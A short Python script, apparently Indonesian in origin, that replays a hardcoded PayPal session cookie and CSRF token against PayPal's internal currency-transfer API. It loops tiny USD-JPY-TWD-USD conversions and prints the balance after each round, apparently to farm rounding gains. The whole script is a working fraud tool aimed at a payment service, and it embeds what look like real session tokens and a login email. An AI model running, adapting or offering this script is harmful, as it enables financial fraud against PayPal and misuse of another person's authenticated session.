#Osyduck

import requests, time, json, datetime

cookie = 'LANG=en_US%3BID; X-PP-L7=1; cookie_check=yes; _ga=GA1.2.1241400810.1582168495; ts_c=vr%3D60973bbf1700ac054b790e40fffc47e5%26vt%3D60973c1c1700ac054b790e40fffc47e4; _gcl_au=1.1.996745159.1582168532; nsid=s%3ArQtsaIX2NjmZZAWsigT2lwufTPDCvjor.oSlHzR%2FUHB%2B0PM%2Fae07ywillq87HgTP8IsWDJ2J%2Bf2Q; KHcl0EuY7AKSMgfvHl7J5E7hPtK=ee71N8-kUceJQHTCm0P8cab3CUknNfrwMj4tUYqz8vc0X0gVxoWSpf91fWjYmC-ARXO5ufdOprOnr-fO; login_email=riskialam%40osyduck.me; ui_experience=d_id%3Dfbd833141fd34ba1b53846947e9f93e21582168779910%26login_type%3DEMAIL_PASSWORD%26home%3D2; fn_dt=fbd833141fd34ba1b53846947e9f93e2; id_token=idtokenc5da669d19a24435a1cdce4cedee1e40; X-PP-ADS=AToB0fpNXsXnzinyNjK9LWFUYKUfnN4; SEGM=bRdV1vB0ebq9RKdAb3xSHowCi6QnnlCiDOLNk8i1mAuLl1vTbzHQwWajSsMe8mvoWiJtY1GnpzN4Y-sixGy7BQ; _gat_PayPal=1; HaC80bwXscjqZ7KM6VOxULOB534=y6Fv2C-auG2lXGV32HsMPijGIaSSbzB_Adw6tNX5UKhUNBeW7XkXfif2W6BiZ76TBbKA5A7JxY2QXjv02U_UVR1gGApvT4fSBLVMlcIpYBbWU17klnCBG37QL_7dFT4U2FlS4G; x-pp-s=eyJ0IjoiMTU4MjE3MDU3NDAzOSIsImwiOiIwIiwibSI6IjAifQ; tsrce=authchallengenodeweb; X-PP-SILOVER=name%3DLIVE3.WEB.1%26silo_version%3D880%26app%3Dauthchallengenodeweb%26TIME%3D1582170574%26HTTP_X_PP_AZ_LOCATOR%3Ddcg12.slc; akavpau_ppsd=1582171174~id=957c2296d60895814df677ffb8e27545; ts=vreXpYrS%3D1676864974%26vteXpYrS%3D1582172374%26vr%3D60973bbf1700ac054b790e40fffc47e5%26vt%3D60973c1c1700ac054b790e40fffc47e4'
csrf = 'AmUiCyUGeFxJh7AE2eZdoJWbSLVvoJMnAcUNU='



def getStr(string,start,end):
	str = string.split(start)
	str = str[1].split(end)
	return str[0]

def req(cookie, payload):
    url = "https://www.paypal.com/myaccount/money/api/currencies/transfer"

    #payload = "{\"sourceCurrency\":\"USD\",\"sourceAmount\":0.02,\"targetCurrency\":\"JPY\",\"_csrf\":\"AmUiCyUGeFxJh7AE2eZdoJWbSLVvoJMnAcUNU=\"}"
    headers = {
    'Host': 'www.paypal.com',
    'Connection': 'keep-alive',
    'Accept': 'application/json',
    'Origin': 'https://www.paypal.com',
    'X-Requested-With': 'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Mobile Safari/537.36',
    'Content-Type': 'application/json',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Referer': 'https://www.paypal.com/myaccount/money/currencies/USD/transfer/JPY/review',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cookie': cookie
    }

    response = requests.request("POST", url, headers=headers, data = payload)
    return response.text



brp = int(input("Berapa kali loop: "))
for i in range(brp):
    Data_USD_to_JPY = "{\"sourceCurrency\":\"USD\",\"sourceAmount\":0.02,\"targetCurrency\":\"JPY\",\"_csrf\":\"%s\"}"%(csrf)
    Data_JPY_to_TWD = "{\"sourceCurrency\":\"JPY\",\"sourceAmount\":2,\"targetCurrency\":\"TWD\",\"_csrf\":\"%s\"}"%(csrf)
    Data_TWD_to_USD = "{\"sourceCurrency\":\"TWD\",\"sourceAmount\":1,\"targetCurrency\":\"USD\",\"_csrf\":\"%s\"}"%(csrf)


    USD_to_JPY = req(cookie, Data_USD_to_JPY)
    time.sleep(10)
    JPY_to_TWD = req(cookie, Data_JPY_to_TWD)
    time.sleep(10)
    TWD_to_USD = req(cookie, Data_TWD_to_USD)
    time.sleep(10)

    x = datetime.datetime.now()
    balance = getStr(TWD_to_USD, 'totalAvailable":{"amount":"', '"')
    print("[%s] Balance: %s"%(x, balance))
